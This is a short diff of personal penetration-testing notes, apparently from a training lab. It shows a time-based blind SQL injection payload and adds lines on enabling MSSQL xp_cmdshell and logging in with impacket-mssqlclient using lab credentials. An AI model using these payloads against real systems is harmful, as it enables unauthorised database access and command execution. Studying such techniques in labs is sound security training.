@@ -17,3 +17,10 @@ For UNION SQLi attacks to work, we first need to satisfy two conditions:
 BLIND - Timebased
 
 http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //  # if offsec user is present, application will freeze for 3 second
+
+
+MSSQL
+#activate xp_cmdshell
+#IMPORTANT: it's need privilegie to do this, escale first!
+#MSSQL defaul port 1433
+impacket-mssqlclient Administrator:Lab123@192.168.194.18 -windows-auth
